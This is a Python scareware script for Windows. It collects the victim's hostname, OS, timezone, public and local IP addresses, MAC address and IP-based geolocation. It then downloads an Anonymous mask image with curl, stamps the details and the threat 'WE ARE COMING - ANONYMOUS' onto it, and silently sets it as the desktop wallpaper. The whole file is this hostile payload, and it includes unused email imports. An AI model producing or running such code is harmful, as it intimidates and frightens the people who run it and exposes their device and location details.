from PIL import Image, ImageDraw
from PIL import ImageFont, ImageDraw, Image
import ctypes
from uuid import getnode as get_mac
import smtplib, ssl
from email.message import EmailMessage
import geocoder
import subprocess
import socket
from requests import get
import datetime
import json
import os
import sys
import platform
import time
from PIL import Image

startTime = time.time()

#Operating System Information
print('Getting System Information...')
my_os = platform.system()
my_os_extra = sys.platform

#Get Timezone Information
print('Getting Timezone Information...')
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)

#Public IP Configuration
print('Requesting IPV4 Adress from api.ipify.org...')
get_ip = get('https://api.ipify.org').content.decode('utf8')
print('Requesting IPV6 Adress from api.ipify.org...')
get_ipv6 = get('https://api64.ipify.org').content.decode('utf8')
ip = geocoder.ip(get_ipv6)

#IP JSON Configuration
print('Requesting IP Adress Information From ip-api.com...')
ip_json = get(f'http://ip-api.com/json/{get_ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,isp,reverse,proxy')
y = ip_json.json()

#Extract Details From IP ip-api JSON
print('Parsing JSON Data From API Request...')
country_code = y['country']
city_name = y['city']
region = y['regionName']
zip_code = y['zip']
district = y['district']

latstring = str(y['lat'])
longstring = str(y['lon'])

ip_coords = latstring + ' ' + longstring

if zip_code == '':
    zip_code = 'Not Detected'

if district == '':
    district = 'Not Detected'
    

#Local IP Configuration
print('Getting Local Network IP...')
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)

#Local MAC Configuration
print('Grabbing MAC Adress...')
mac_adress = get_mac()

#Assign Variables
content = f"Device Name: {hostname}\n"
content += f"Operating System: {my_os}, {my_os_extra}\n"
content += f"System Timezone: {local_tzname}\n"
content += f"System Time: {now}\n"
content += f"Public IPV4 Adress: {get_ip}\n"
content += f"Public IPV6 Adress: {get_ipv6}\n"
content += f"Local IP Adress: {IPAddr}\n"
content += f"local MAC Adress: {mac_adress}\n"
content += "\n\nWE ARE COMING\n\n"
content += "- ANONYMOUS"

#Make Image

#Download image of anonymous mask
os.system('curl -o C:\\tmp\\scare.png https://miro.medium.com/max/2000/1*EQPani1J-PTO-ccp588gBg.jpeg')
base_image = Image.open(r"C:\\tmp\\scare.png")

draw = ImageDraw.Draw(base_image, "RGBA")
font = ImageFont.truetype("arial.ttf", 35)
draw.text((670, 450), content, fill=(255, 255, 255, 255), font=font)
base_image.save("C:\\tmp\\scary.png")

#Set As Desktop Background
ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\tmp\\scary.png" , 0)
os.remove('C:\\tmp\\scare.png')


